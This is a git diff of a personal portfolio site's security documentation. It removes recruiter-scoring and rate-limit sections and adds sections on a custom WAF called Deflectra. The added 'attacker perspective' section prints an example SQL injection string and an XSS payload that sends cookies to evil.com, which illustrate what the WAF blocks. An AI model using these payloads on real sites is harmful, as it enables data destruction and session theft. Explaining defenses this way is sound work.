@@ -48,6 +48,13 @@ This documentation covers the complete system architecture, data flows, implemen
 - [IP Block List System](#ip-block-list-system)
 - [Geographic Blocking Rules System](#geographic-blocking-rules-system)
 
+### Deflectra WAF (Web Application Firewall)
+- [Deflectra WAF Overview](#deflectra-waf-overview)
+- [How Deflectra Works: Visitor Perspective](#how-deflectra-works-visitor-perspective)
+- [How Deflectra Works: Attacker Perspective](#how-deflectra-works-attacker-perspective)
+- [WAF Request Flow](#waf-request-flow)
+- [WAF Analytics and Monitoring](#waf-analytics-and-monitoring)
+
 ### Security Architecture & Threat Mitigation
 - [Security Architecture Overview](#security-architecture-overview)
 - [Identified Threats and Mitigation Strategies](#identified-threats-and-mitigation-strategies)
@@ -1716,129 +1723,19 @@ const getVisitorType = () => {
    - Session duration ≥3 minutes: +10 points
    - 3+ chatbot queries: +10 points
 
-6. **Signal 5 - Contact Intent Detection** (NEW):
-   - Clicked any contact link (email, LinkedIn, GitHub): +15 points
-   - Asked about availability/contact in chatbot: +15 points
-   - Availability keywords include: "available", "availability", "when can", "start date", "notice period", "hire", "interview", "schedule"
-
-7. **Classification Thresholds**:
-   - Score ≥70: "Very Likely Recruiter" (high confidence, triggers immediate alert)
+6. **Classification Thresholds**:
    - Score ≥50: "Likely Recruiter" (strong multi-signal match)
    - Score ≥30: "Potential Recruiter" (moderate signals)
    - Fallback to engagement-based labels (Engaged Visitor, Project Explorer, Active Browser, New Visitor)
 
 | Visitor Type | Trigger Condition | Score Range |
 |-------------|-------------------|-------------|
-| **Very Likely Recruiter** | High confidence signals + contact intent | ≥70 points |
-| **Likely Recruiter** | Multiple strong signals | 50-69 points |
+| **Likely Recruiter** | Multiple strong signals | ≥50 points |
 | **Potential Recruiter** | Some recruiter signals | 30-49 points |
 | **Engaged Visitor** | 3+ chatbot queries | N/A (fallback) |
 | **Project Explorer** | Clicked 3+ projects | N/A (fallback) |
 | **Active Browser** | Viewed 4+ sections | N/A (fallback) |
 | **New Visitor** | Default | N/A (default) |
-
-### Contact Intent Detection
-
-The system tracks contact intent through two mechanisms:
-
-1. **Contact Link Clicks**: When visitors click on email links, LinkedIn profile, GitHub, or open the contact form, this is tracked as a strong signal of intent to reach out.
-
-2. **Availability Queries**: Chatbot queries containing availability-related keywords are detected:
-   - "available", "availability", "when can", "start date"
-   - "notice period", "open to", "looking for"
-   - "hire", "hiring", "interview", "schedule", "meet"
-
-**Implementation** (`src/components/VisitorTrackerProvider.tsx`):
-
-```typescript
-// Availability/contact intent keywords
-const AVAILABILITY_KEYWORDS = [
-  'available', 'availability', 'when can', 'start date', 'notice period',
-  'open to', 'looking for', 'interested in', 'hire', 'hiring', 'reach out',
-  'contact', 'email', 'phone', 'call', 'interview', 'schedule', 'meet'
-];
-
-// Track contact link clicks
-const trackContactClick = useCallback((contactType: string, contactValue?: string) => {
-  contactClicksRef.current.push(contactType);
-  trackActivity('contact_click', { contact_type: contactType, value: contactValue });
-}, [trackActivity]);
-
-// Check if visitor has contact intent
-const hasContactIntent = useCallback(() => {
-  if (contactClicksRef.current.length > 0) return true;
-  const availabilityQueries = chatbotQueriesRef.current.filter(q => 
-    AVAILABILITY_KEYWORDS.some(kw => q.toLowerCase().includes(kw))
-  );
-  return availabilityQueries.length > 0;
-}, []);
-```
-
-**UI Display**: Sessions with contact intent are marked with a "Contact Intent" badge in the Potential Recruiters section.
-
-### Potential Recruiters Dashboard Section
-
-The `PotentialRecruiters.tsx` component displays a dedicated section in the Visitors tab showing high-scoring sessions (score ≥30):
-
-**Features**:
-- **Session Cards**: Each potential recruiter session displays score, badge, and time
-- **Score Breakdown Tooltip**: Hover to see exactly how points were earned
-- **Contact Intent Badge**: Emerald badge appears when contact intent is detected
-- **Activity Summary**: Resume downloads, views, chatbot queries, and total actions
-- **Sections Viewed**: Professional sections highlighted with primary color
-- **Sample Queries**: Up to 2 chatbot queries shown for context
-
-**Score Thresholds**:
-- 🟢 **70+ Very Likely**: Green badge, highest confidence
-- 🟡 **50-69 Likely**: Amber badge, strong signals
-- 🔵 **30-49 Possible**: Blue badge, moderate interest
-
-**Code Location**: `src/components/PotentialRecruiters.tsx`
-
-### High-Confidence Recruiter Alerts
-
-When a session reaches 70+ points (Very Likely Recruiter), a separate high-confidence alert is triggered:
-
-**Alert Features**:
-- Different email subject with double 🎯🎯 emoji for visibility
-- Green gradient header (vs orange for standard alerts)
-- "HIGH CONFIDENCE RECRUITER" badge
-- Contact intent indicator in subject line
-- All confidence signals listed with checkmarks
-
-**Implementation** (`src/components/VisitorTrackerProvider.tsx`):
-
-```typescript
-// Send recruiter-specific alert
-const sendRecruiterAlert = useCallback(async (isHighScore: boolean = false) => {
-  if (isHighScore) {
-    if (highScoreAlertSentRef.current || isOwner) return;
-    highScoreAlertSentRef.current = true;
-  } else {
-    if (recruiterAlertSentRef.current || isOwner) return;
-    recruiterAlertSentRef.current = true;
-  }
-  
-  const score = calculateRecruiterScore();
-  if (!isHighScore && score < 50) return;
-  if (isHighScore && score < 70) return;
-  
-  // Send alert with contact intent data
-  await supabase.functions.invoke('send-recruiter-alert', {
-    body: {
-      // ... other fields
-      contact_clicks: contactClicksRef.current,
-      has_contact_intent: hasContactIntent(),
-      is_high_confidence: isHighScore
-    }
-  });
-}, [isOwner, calculateRecruiterScore, hasContactIntent]);
-```
-
-**Dual Alert System**:
-- Standard alert at 50+ points (sent once per session)
-- High-confidence alert at 70+ points (separate flag, can trigger alongside standard)
-- Both use different ref flags to allow both alerts for the same session
 
 ### Session Timeline
 
@@ -2540,10 +2437,10 @@ flowchart LR
 **How the Layers Work Together:**
 
 0. **WAF Layer (First Check - Deflectra)**:
-   - All public-facing edge function requests (contact form, chatbot, auth logging) are first routed through the Deflectra WAF proxy
-   - AI-powered inspection detects SQL injection, XSS, and command injection patterns in request bodies
+   - All public-facing edge function requests are routed through the Deflectra WAF proxy
+   - AI-powered inspection detects SQL injection, XSS, and command injection patterns
    - Malicious payloads are blocked with a 403 response before reaching any edge function
-   - Fails open: if the WAF proxy is unreachable, requests proceed normally to ensure availability
+   - Fails open if proxy is unreachable to ensure availability
 
 1. **Geographic Layer (Second Check)**: 
    - Fastest rejection path - stops attacks from entire countries before any processing
@@ -2584,7 +2481,7 @@ flowchart LR
 
 ### Deflectra WAF Integration
 
-The portfolio integrates with **Deflectra**, a custom-built AI-powered Web Application Firewall, as the outermost security layer.
+The portfolio integrates with **Deflectra**, a custom-built AI-powered Web Application Firewall, as the outermost security layer (Layer 0).
 
 #### Architecture
 
@@ -2594,80 +2491,264 @@ Client Request → Deflectra WAF Proxy → Edge Function → Response
                403 Blocked
 ```
 
-#### Protected Endpoints
-
-| Edge Function | Protection | Threat Mitigated |
-|--------------|------------|------------------|
-| `send-contact-email` | Body inspection | SQLi, XSS in form fields |
-| `portfolio-chatbot` | Message inspection | Prompt injection, XSS |
-| `log-auth-attempt` | Payload inspection | SQLi in email/credentials |
-| `send-visitor-alert` | Body inspection | Malformed payloads |
-| `send-recruiter-alert` | Body inspection | Malformed payloads |
-
-#### Implementation Details
-
-- **Proxy URL**: Routes through `waf-proxy` edge function on separate Supabase project
-- **Site ID**: Registered site identifier for the portfolio
-- **Fail-Open Design**: If the WAF proxy is unreachable, requests proceed to edge functions directly to ensure availability
-- **Dynamic Import**: WAF module is lazy-loaded via `import()` to minimize bundle impact
-- **User Feedback**: Blocked requests show clear error messages (contact form toast, chatbot inline message)
-
-#### Configuration (`src/lib/waf-proxy.ts`)
-
-```typescript
-const DEFLECTRA_PROXY = "https://[project].supabase.co/functions/v1/waf-proxy";
-const SITE_ID = "[site-id]";
-const WAF_MODE: WafMode = 'full_proxy'; // 'preflight' | 'full_proxy'
-const WAF_PROTECTED_FUNCTIONS = [
-  'send-contact-email',
-  'portfolio-chatbot', 
-  'log-auth-attempt',
-  'send-visitor-alert',
-  'send-recruiter-alert',
-];
-```
-
 #### Routing Modes
 
-The WAF supports two routing modes configured via `WAF_MODE`:
+| Mode | Behavior |
+|------|----------|
+| `preflight` | Inspects payload at WAF, then calls edge function directly from client |
+| `full_proxy` | Routes entire request through WAF proxy, which forwards clean requests to origin |
 
-| Mode | Behavior | Use Case |
-|------|----------|----------|
-| `preflight` | Inspects payload at WAF, then calls edge function directly from client | Lower latency, WAF only validates |
-| `full_proxy` | Routes entire request through WAF proxy, which forwards clean requests to the origin edge function | Full protection, single request path |
+**Current mode: `full_proxy`** — All protected edge function traffic flows through Deflectra for inspection and forwarding.
 
-**Current mode: `full_proxy`** — All protected edge function traffic flows through Deflectra. The WAF inspects the payload and, if clean, forwards the request to the portfolio's Supabase backend (`nvgfgoykyeouwrksszpb.supabase.co/functions/v1/*`). Blocked requests never reach the backend.
+#### Protected Functions
+
+- `send-contact-email` — Contact form submissions
+- `portfolio-chatbot` — AI chatbot queries
+- `log-auth-attempt` — Authentication attempt logging
+- `send-visitor-alert` — Visitor notification emails
+- `send-recruiter-alert` — Recruiter detection alerts
 
 #### WAF Event Logging (`waf_events` table)
 
-Every WAF inspection (allowed or blocked) is logged to the `waf_events` database table for analytics:
+Every inspection result is logged for analytics:
 
 | Column | Type | Description |
 |--------|------|-------------|
-| `id` | uuid | Primary key |
-| `function_name` | text | Edge function that was called |
-| `blocked` | boolean | Whether the request was blocked |
+| `function_name` | text | Edge function called |
+| `blocked` | boolean | Whether request was blocked |
 | `reason` | text | Block reason (null if allowed) |
 | `waf_mode` | text | Mode used (`preflight` or `full_proxy`) |
 | `created_at` | timestamptz | Event timestamp |
 
-RLS policies ensure only owners can view/delete events; anonymous inserts are allowed for logging.
+#### WAF Analytics Dashboard
 
-#### WAF Analytics Dashboard (`WafStats` component)
-
-The owner dashboard includes a dedicated WAF Analytics section (`src/components/WafStats.tsx`) that visualizes:
-
-- **Summary cards**: Total requests, allowed, blocked, block rate percentage
-- **7-day trend chart**: Bar chart showing daily allowed vs. blocked traffic
-- **Block ratio pie chart**: Visual breakdown of allowed vs. blocked
-- **Per-endpoint breakdown**: Table showing which edge functions see the most WAF activity
-- **Recent blocked requests**: List of recently blocked requests with reasons and timestamps
+The owner dashboard includes WAF Analytics with summary cards, 7-day trend charts, block ratio visualization, per-endpoint breakdowns, and recent blocked request listings.
 
 #### Fail-Open Design
 
-If the Deflectra WAF proxy is unreachable (network error, timeout), the system **fails open** — requests are forwarded directly to the edge function to ensure site availability. These fallback events are logged with reason `proxy_fallback` or `proxy_unreachable`.
+If the WAF proxy is unreachable, requests proceed directly to edge functions to ensure availability. Fallback events are logged with reason `proxy_fallback`.
 
 With security systems in place to block threats, the portfolio keeps the owner informed through a comprehensive automated email notification system.
+
+---
+
+## Deflectra WAF Overview
+
+Deflectra is a custom-built Web Application Firewall (WAF) that acts as **Layer 0** of this portfolio's security architecture — the first line of defense before any dynamic request reaches the backend. While the portfolio's static assets (HTML, CSS, JavaScript) are served directly from the hosting platform without interception, all dynamic API traffic — chatbot queries, contact form submissions, authentication attempts, and alert triggers — is routed through the Deflectra WAF proxy for real-time inspection.
+
+### What Deflectra Achieves for This Portfolio
+
+The portfolio exposes several edge functions that accept user input (chatbot messages, contact form data, login credentials). Without a WAF, these endpoints are directly accessible and vulnerable to:
+
+- **SQL Injection (SQLi)** — Malicious database queries injected through input fields
+- **Cross-Site Scripting (XSS)** — Script injection through chatbot messages or contact forms
+- **Abuse and spam** — Automated bots flooding the contact form or chatbot
+- **Reconnaissance** — Probing edge function endpoints for vulnerabilities
+
+Deflectra inspects every request payload against a ruleset of known attack patterns *before* the request ever reaches the actual edge function, acting as a security gateway.
+
+### Protected Functions
+
+The following edge functions are routed through Deflectra in **full proxy mode**:
+
+| Edge Function | Purpose | Why It Needs WAF Protection |
+|---|---|---|
+| `portfolio-chatbot` | AI chatbot responses | Accepts free-text user input — prime target for prompt injection and XSS |
+| `send-contact-email` | Contact form emails | Accepts name, email, and message — classic SQLi/XSS attack surface |
+| `log-auth-attempt` | Login attempt logging | Records authentication data — attacker could inject malicious payloads |
+| `send-visitor-alert` | Visitor notification emails | Processes visitor session data that could contain crafted payloads |
+| `send-recruiter-alert` | Recruiter notification emails | Processes visitor classification data |
+
+---
+
+## How Deflectra Works: Visitor Perspective
+
+From a legitimate visitor's perspective, Deflectra is completely invisible. Here is what happens when a normal user interacts with the portfolio:
+
+**1. Browsing the Portfolio (No WAF Involvement)**
+
+When a visitor opens the portfolio website, the browser loads static assets — HTML, CSS, JavaScript bundles, images, and fonts. These are served directly from the hosting CDN. Deflectra does not inspect or intercept static content because there is no user input to validate and no attack surface.
+
+**2. Sending a Chatbot Message**
+
+When the visitor types "What programming languages does Ritvik know?" into the AI chatbot:
+
+1. The frontend's `smartInvoke()` function detects that `portfolio-chatbot` is a WAF-protected function
+2. Instead of calling the edge function directly, the request is sent to the **Deflectra WAF proxy**
+3. Deflectra inspects the request payload — the message is clean natural language, so it passes all rules
+4. Deflectra forwards the request to the actual `portfolio-chatbot` edge function
+5. The edge function generates embeddings, performs semantic search, and returns the AI response
+6. The response flows back through Deflectra to the visitor's browser
+
+The visitor experiences no additional latency perceptible to humans. The entire WAF inspection adds only milliseconds.
+
+**3. Submitting the Contact Form**
+
+When the visitor fills out the contact form with their name, email, and a message:
+
+1. The frontend routes the request through Deflectra's WAF proxy
+2. Deflectra validates the payload — no SQL keywords, no script tags, no suspicious patterns
+3. The clean request is forwarded to `send-contact-email`
+4. The email is sent via Resend API
+5. The visitor sees a success confirmation
+
+**Key Point**: For legitimate users, the WAF is a transparent security layer that protects them as much as it protects the application — ensuring no malicious content from other users could compromise the system they're interacting with.
+
+---
+
+## How Deflectra Works: Attacker Perspective
+
+From an attacker's perspective, Deflectra acts as an impenetrable gate that blocks malicious requests before they reach any backend logic.
+
+**Scenario 1: SQL Injection Attempt via Contact Form**
+
+An attacker submits a contact form with the message field containing:
+```
+'; DROP TABLE visitor_activity; --
+```
+
+1. The frontend routes the request through Deflectra
+2. Deflectra's rule engine scans the payload and detects SQL injection patterns (`DROP TABLE`, SQL comment syntax `--`, string escape `'`)
+3. The request is **immediately blocked** with HTTP 403
+4. Deflectra returns a branded block page: *"Request Blocked — SQL Injection attempt detected"*
+5. The block event is logged in the `waf_events` table with `blocked: true` and the reason
+6. The actual `send-contact-email` edge function **never executes** — the attacker's payload never reaches the database layer
+7. The event appears in the Owner Dashboard WAF Analytics panel
+
+**Scenario 2: XSS Attack via AI Chatbot**
+
+An attacker sends a chatbot message containing:
+```
+<script>document.location='https://evil.com/steal?c='+document.cookie</script>
+```
+
+1. The request is routed through Deflectra
+2. Deflectra detects `<script>` tags and JavaScript execution patterns
+3. The request is blocked — the malicious script never reaches the chatbot edge function
+4. Even if it somehow bypassed the WAF, additional layers (DOMPurify sanitization, Content Security Policy) provide defense-in-depth
+
+**Scenario 3: Automated Bot Flooding**
+
+A bot attempts to send hundreds of chatbot requests per minute:
+
+1. Each request hits Deflectra first
+2. Deflectra's rate limiting detects abnormal request frequency from the same origin
+3. After the threshold is exceeded, subsequent requests are blocked
+4. The edge function rate limiter (configured in `cors-rate-limit.ts`) provides a second layer of defense
+5. The portfolio remains responsive for legitimate visitors
+
+**Scenario 4: Reconnaissance and Probing**
+
+An attacker tries to probe edge function endpoints with malformed requests to discover vulnerabilities:
+
+1. All requests to protected functions must pass through Deflectra
+2. Malformed payloads, missing required fields, and suspicious headers are flagged
+3. The attacker receives generic block responses — no information about the backend is leaked
+4. All probing attempts are logged for the portfolio owner to review
+
+---
+
+## WAF Request Flow
+
+```mermaid
+flowchart TB
+    subgraph Client["Visitor's Browser"]
+        UI[Portfolio Frontend]
+        SI[smartInvoke Function]
+    end
+
+    subgraph Deflectra["Deflectra WAF Proxy"]
+        RP[Request Parser]
+        RE[Rule Engine]
+        RL[Rate Limiter]
+        AI[AI Analysis]
+        BP[Block Page]
+    end
+
+    subgraph Backend["Portfolio Backend"]
+        EF[Edge Functions]
+        DB[(Database)]
+        WE[(waf_events)]
+    end
+
+    UI -->|Dynamic Request| SI
+    SI -->|POST with payload| RP
+    RP --> RE
+    RE -->|Clean| RL
+    RE -->|Malicious| BP
+    RL -->|Within Limits| AI
+    RL -->|Exceeded| BP
+    AI -->|Safe| EF
+    AI -->|Suspicious| BP
+    BP -->|403 Blocked| UI
+    EF -->|Response| UI
+    EF --> DB
+    SI -->|Log Event| WE
+```
+
+**Figure WAF-1: Deflectra WAF Request Flow** - This diagram shows the complete request lifecycle through the Deflectra WAF proxy. Clean requests pass through multiple inspection stages before reaching the edge function. Malicious requests are blocked at the earliest detection point and never reach the backend.
+
+### Full Proxy Mode Implementation
+
+The portfolio operates Deflectra in **full proxy mode**, meaning the WAF doesn't just inspect requests — it also forwards clean requests to the actual edge function and returns the response. This is implemented in the frontend's `smartInvoke()` function:
+
+```typescript
+// src/lib/waf-proxy.ts — Smart invoke routes through WAF
+export async function smartInvoke(
+  functionName: string,
+  body?: Record<string, any>,
+): Promise<{ blocked: boolean; data?: any; error?: any }> {
+  // Skip WAF for non-protected functions
+  if (!WAF_ENABLED || !WAF_PROTECTED_FUNCTIONS.includes(functionName)) {
+    return { blocked: false };
+  }
+
+  // Full proxy mode: WAF inspects AND forwards to edge function
+  const result = await wafInvoke(functionName, body);
+  if (result.error?.waf_blocked) {
+    return { blocked: true, error: result.error };
+  }
+  return { blocked: false, data: result.data, error: result.error };
+}
+```
+
+### Fail-Open Design
+
+If the Deflectra WAF proxy is unreachable (network issues, service outage), the system **fails open** — requests fall back to calling the edge function directly. This ensures the portfolio remains functional even if the WAF is temporarily unavailable:
+
+```typescript
+// Fail-open fallback in wafInvoke()
+catch (error) {
+  console.warn('[WAF] Full proxy failed, falling back:', error);
+  await logWafEvent(functionName, false, 'proxy_fallback');
+  return directInvoke(functionName, body);  // Direct call to edge function
+}
+```
+
+This is a deliberate architectural decision: **availability over strict security**. For a portfolio website, a brief period without WAF inspection is acceptable — the edge functions still have their own input validation, rate limiting, and sanitization as defense-in-depth layers.
+
+---
+
+## WAF Analytics and Monitoring
+
+Every request that passes through Deflectra — whether allowed or blocked — is logged in the `waf_events` table:
+
+| Column | Description |
+|---|---|
+| `function_name` | Which edge function was targeted |
+| `blocked` | Whether the request was blocked (`true`/`false`) |
+| `reason` | Why it was blocked (e.g., "SQL Injection attempt detected") or null if allowed |
+| `waf_mode` | The WAF routing mode used (`full_proxy` or `preflight`) |
+| `created_at` | Timestamp of the event |
+
+The **Owner Dashboard** includes a dedicated WAF Analytics panel that visualizes:
+
+- **Allowed vs. Blocked requests** over time (bar chart)
+- **Block reasons** breakdown (which attack types are being attempted)
+- **Protected function distribution** (which endpoints are targeted most)
+- **Recent events log** with full details
+
+This gives the portfolio owner real-time visibility into the security posture and attack patterns targeting their application.
 
 ---
 
@@ -2681,7 +2762,6 @@ The portfolio application consists of three core components that work together u
 
 | Component | Security Responsibilities |
 |-----------|--------------------------|
-| **WAF (Deflectra)** | AI-powered payload inspection, SQLi/XSS blocking at proxy layer |
 | **Frontend (React + Supabase Auth)** | User sessions, secure authentication, input validation |
 | **Backend (Supabase)** | Row-Level Security (RLS), Role-Based Access Control (RBAC), database triggers |
 | **AI Chatbot** | Data isolation, sanitization, request throttling via DOMPurify |
@@ -3162,8 +3242,8 @@ The portfolio includes a comprehensive automated email notification system that 
 
 - **XSS Prevention**: `DOMPurify` sanitizes all user-facing HTML
 - **Input Validation**: Zod schema validation for all forms
-- **Rate Limiting**: Endpoint-specific rate limits with automatic alerting
-- **CORS**: Strict origin validation against allowlist
+- **Rate Limiting**: Chatbot and contact form rate limits
+- **CORS**: Restricted to verified domains
 - **Leaked Password Protection**: Supabase checks against breach databases
 - **Prompt Injection Defense**: Detects manipulation attempts in chatbot
 - **JWT Authentication**: Secure token-based auth via Supabase
@@ -3173,499 +3253,7 @@ The portfolio includes a comprehensive automated email notification system that 
 - **Known Location Tracking**: Maintains a database of trusted login locations with auto-trust capabilities
 - **Auto-Trust System**: Automatically trusts locations after 5+ successful logins from the same IP
 
-The following sections provide detailed documentation of the CORS policies, rate limiting implementation, and rate limit alerting system.
-
----
-
-## CORS Policy & Rate Limiting System
-
-The portfolio implements enterprise-grade CORS policies and rate limiting to protect against abuse, denial of service attacks, and unauthorized API access.
-
-### Architecture Overview
-
-```mermaid
-flowchart TD
-    subgraph Request["Incoming Request"]
-        REQ[HTTP Request]
-        ORIGIN[Origin Header]
-        IP[Client IP]
-    end
-
-    subgraph CORS["CORS Validation"]
-        CHECK_ORIGIN{Origin in Allowlist?}
-        CORS_PASS[Set CORS Headers]
-        CORS_BLOCK[403 Forbidden]
-    end
-
-    subgraph RateLimit["Rate Limiting"]
-        CHECK_LIMIT{Under Limit?}
-        INCREMENT[Increment Counter]
-        RATE_BLOCK[429 Too Many Requests]
-    end
-
-    subgraph Alerting["Violation Alerting"]
-        TRACK_VIOLATION[Track Violation]
-        CHECK_THRESHOLD{Violations >= 3?}
-        CHECK_COOLDOWN{Cooldown Expired?}
-        SEND_ALERT[Send Email Alert]
-    end
-
-    subgraph Process["Request Processing"]
-        HANDLER[Edge Function Handler]
-        RESPONSE[Response with Headers]
-    end
-
-    REQ --> ORIGIN
-    REQ --> IP
-    ORIGIN --> CHECK_ORIGIN
-    
-    CHECK_ORIGIN -->|Yes| CORS_PASS
-    CHECK_ORIGIN -->|No| CORS_BLOCK
-    
-    CORS_PASS --> CHECK_LIMIT
-    IP --> CHECK_LIMIT
-    
-    CHECK_LIMIT -->|Yes| INCREMENT
-    CHECK_LIMIT -->|No| RATE_BLOCK
-    
-    RATE_BLOCK --> TRACK_VIOLATION
-    TRACK_VIOLATION --> CHECK_THRESHOLD
-    CHECK_THRESHOLD -->|Yes| CHECK_COOLDOWN
-    CHECK_THRESHOLD -->|No| RESPONSE
-    CHECK_COOLDOWN -->|Yes| SEND_ALERT
-    CHECK_COOLDOWN -->|No| RESPONSE
-    
-    INCREMENT --> HANDLER
-    HANDLER --> RESPONSE
-```
-
-**Figure CRL-1: CORS & Rate Limiting Flow** - Request processing flow showing origin validation, rate limit checking, and automatic alerting for repeat offenders.
-
-### CORS Configuration
-
-The portfolio uses strict CORS policies that only allow requests from verified domains:
-
-```typescript
-// Allowed origins - only the portfolio domain and local development
-const ALLOWED_ORIGINS = [
-  'https://ritvik-portfolio.lovable.app',
-  'https://ritvikindupuri.com',
-  'https://www.ritvikindupuri.com',
-  'http://localhost:5173',
-  'http://localhost:8080',
-  'http://localhost:3000',
-];
-```
-
-**CORS Headers Applied:**
-
-| Header | Value | Purpose |
-|--------|-------|---------|
-| `Access-Control-Allow-Origin` | Validated origin | Restricts which domains can access the API |
-| `Access-Control-Allow-Headers` | `authorization, x-client-info, apikey, content-type` | Specifies allowed request headers |
-| `Access-Control-Allow-Methods` | `GET, POST, PUT, DELETE, OPTIONS` | Specifies allowed HTTP methods |
-| `Access-Control-Allow-Credentials` | `true` | Allows credentials in cross-origin requests |
-| `Content-Security-Policy` | `default-src 'self'; script-src 'none'; object-src 'none'` | Prevents XSS in API responses |
-| `X-Content-Type-Options` | `nosniff` | Prevents MIME-type sniffing |
-| `X-Frame-Options` | `DENY` | Prevents clickjacking |
-| `X-XSS-Protection` | `1; mode=block` | Legacy XSS protection |
-
-### Rate Limit Configuration
-
-Different endpoints have tailored rate limits based on expected usage patterns:
-
-| Endpoint | Limit | Window | Rationale |
-|----------|-------|--------|-----------|
-| `chatbot` | 30 requests | 1 hour | Prevents AI abuse while allowing normal conversation |
-| `contact` | 5 requests | 1 hour | Prevents spam form submissions |
-| `auth` | 10 requests | 15 minutes | Balances security with user convenience |
-| `general` | 100 requests | 1 minute | Default limit for misc endpoints |
-| `geolocate` | 45 requests | 1 minute | Respects ip-api.com's free tier limit |
-| `visitor-alert` | 30 requests | 1 minute | Prevents alert flooding |
-| `embeddings` | 50 requests | 1 minute | Balances AI costs with functionality |
-
-**Rate Limit Configuration Code:**
-
-```typescript
-export const RATE_LIMIT_CONFIGS: Record<string, RateLimitConfig> = {
-  'chatbot': { windowMs: 3600000, maxRequests: 30, endpoint: 'chatbot' },
-  'contact': { windowMs: 3600000, maxRequests: 5, endpoint: 'contact' },
-  'auth': { windowMs: 900000, maxRequests: 10, endpoint: 'auth' },
-  'general': { windowMs: 60000, maxRequests: 100, endpoint: 'general' },
-  'geolocate': { windowMs: 60000, maxRequests: 45, endpoint: 'geolocate' },
-  'visitor-alert': { windowMs: 60000, maxRequests: 30, endpoint: 'visitor' },
-  'embeddings': { windowMs: 60000, maxRequests: 50, endpoint: 'embeddings' },
-};
-```
-
-### IP Address Extraction
-
-The system extracts client IP addresses from various proxy headers to ensure accurate rate limiting:
-
-```typescript
-export function getClientIP(req: Request): string {
-  const forwardedFor = req.headers.get('x-forwarded-for');
-  const realIp = req.headers.get('x-real-ip');
-  const cfConnectingIp = req.headers.get('cf-connecting-ip');
-  
-  // x-forwarded-for can contain multiple IPs, take the first (original client)
-  if (forwardedFor) {
-    return forwardedFor.split(',')[0].trim();
-  }
-  
-  return realIp || cfConnectingIp || 'unknown';
-}
-```
-
-**Supported Headers:**
-- `x-forwarded-for`: Standard proxy header (uses first IP in chain)
-- `x-real-ip`: Nginx reverse proxy header
-- `cf-connecting-ip`: Cloudflare connecting IP
-
-### Rate Limit Response
-
-When a client exceeds the rate limit, they receive a `429 Too Many Requests` response:
-
-```json
-{
-  "error": "Rate limit exceeded",
-  "message": "Too many requests. Please try again later.",
-  "retryAfter": "45 seconds"
-}
-```
-
-**Response Headers:**
-- `Retry-After`: Seconds until the rate limit resets
-- `X-RateLimit-Remaining`: Number of requests remaining (0 when exceeded)
-
----
-
-## Rate Limit Alerting System
-
-The portfolio includes automatic alerting when IP addresses repeatedly hit rate limits, indicating potential abuse or attack attempts.
-
-### Alert Flow
-
-```mermaid
-sequenceDiagram
-    participant C as Client
-    participant EF as Edge Function
-    participant RL as Rate Limiter
-    participant VT as Violation Tracker
-    participant ALERT as Alert Function
-    participant RS as Resend API
-    participant O as Owner Email
-
-    Note over C,O: Rate Limit Violation Alerting Flow
-
-    C->>EF: Request #1 (exceeds limit)
-    EF->>RL: Check rate limit
-    RL-->>EF: Denied (429)
-    EF->>VT: Track violation (count: 1)
-    EF-->>C: 429 Too Many Requests
-
-    C->>EF: Request #2 (exceeds limit)
-    EF->>RL: Check rate limit
-    RL-->>EF: Denied (429)
-    EF->>VT: Track violation (count: 2)
-    EF-->>C: 429 Too Many Requests
-
-    C->>EF: Request #3 (exceeds limit)
-    EF->>RL: Check rate limit
-    RL-->>EF: Denied (429)
-    EF->>VT: Track violation (count: 3)
-    
-    Note over VT: Threshold reached!
-    
-    VT->>ALERT: Send alert request
-    ALERT->>ALERT: Build HTML email
-    ALERT->>RS: POST /emails
-    RS->>O: Rate Limit Alert Email
-    VT->>VT: Set cooldown (1 hour)
-    EF-->>C: 429 Too Many Requests
-```
-
-**Figure RLA-1: Rate Limit Alert Sequence** - Shows how repeated rate limit violations trigger automatic email alerts with cooldown to prevent alert fatigue.
-
-### Alert Configuration
-
-```typescript
-const ALERT_CONFIG = {
-  minViolationsForAlert: 3,        // Minimum violations before sending alert
-  alertCooldownMs: 3600000,        // 1 hour cooldown between alerts for same IP/endpoint
-  violationWindowMs: 3600000,      // 1 hour window to count violations
-};
-```
-
-| Parameter | Value | Purpose |
-|-----------|-------|---------|
-| `minViolationsForAlert` | 3 | Prevents false positives from occasional limit hits |
-| `alertCooldownMs` | 1 hour | Prevents alert flooding for persistent attackers |
-| `violationWindowMs` | 1 hour | Resets violation count after window expires |
-
-### Alert Email Contents
-
-When triggered, the rate limit alert email contains:
-
-**Header Section:**
-- 🚦 Rate Limit Alert title
-- Severity badge (LOW/MEDIUM/HIGH based on violation count)
-
-**Alert Details:**
-- **IP Address**: The offending IP address
-- **Endpoint**: Which endpoint was being targeted (chatbot, contact, auth, etc.)
-- **Location**: Geographic location of the IP (city, country)
-- **Times Limited**: Number of rate limit violations in the window
-- **Timestamp**: When the alert was triggered
-- **User Agent**: Browser/client information
-
-**Threat Analysis:**
-- Automated Bot Activity indicator
-- Denial of Service Attempt classification
-- API Abuse detection
-- Misconfigured Client possibility
-
-**Recommended Actions:**
-1. Monitor for continued rate limit hits
-2. Review edge function logs for patterns
-3. Consider blocking the IP (if HIGH severity)
-4. Add to IP blocklist via Owner Dashboard
-
-### Severity Levels
-
-| Level | Violation Count | Badge Color | Actions |
-|-------|-----------------|-------------|---------|
-| LOW | 3-4 violations | 🔵 Blue | Monitor |
-| MEDIUM | 5-9 violations | 🟡 Yellow | Review logs |
-| HIGH | 10+ violations | 🔴 Red | Consider blocking |
-
-### Alert Email Example
-
-```html
-Subject: 🟡 MEDIUM Rate Limit Alert: 192.168.1.100 on chatbot
-
-┌─────────────────────────────────────────────────┐
-│  🚦 Rate Limit Alert                            │
-│  [MEDIUM SEVERITY]                              │
-├─────────────────────────────────────────────────┤
-│  An IP address has been rate limited 7 times    │
-│  within the last 60 minutes on your portfolio.  │
-│                                                 │
-│  📋 Alert Details                               │
-│  ─────────────────                              │
-│  IP Address:    192.168.1.100                   │
-│  Endpoint:      chatbot                         │
-│  Location:      📍 San Francisco, United States │
-│  Times Limited: 7x in 60 min                    │
-│  Timestamp:     Fri, Jan 10, 2:30 PM PST        │
-│                                                 │
-│  🔍 Threat Analysis                             │
-│  ─────────────────                              │
-│  • Automated Bot Activity                       │
-│  • Denial of Service Attempt                    │
-│  • API Abuse                                    │
-│                                                 │
-│  ✅ Recommended Actions                         │
-│  ─────────────────────                          │
-│  1. Monitor for continued rate limit hits       │
-│  2. Review edge function logs                   │
-│  3. Block if needed via Owner Dashboard         │
-└─────────────────────────────────────────────────┘
-```
-
-### Edge Function: send-rate-limit-alert
-
-The alerting is handled by a dedicated edge function:
-
-**Endpoint:** `POST /functions/v1/send-rate-limit-alert`
-
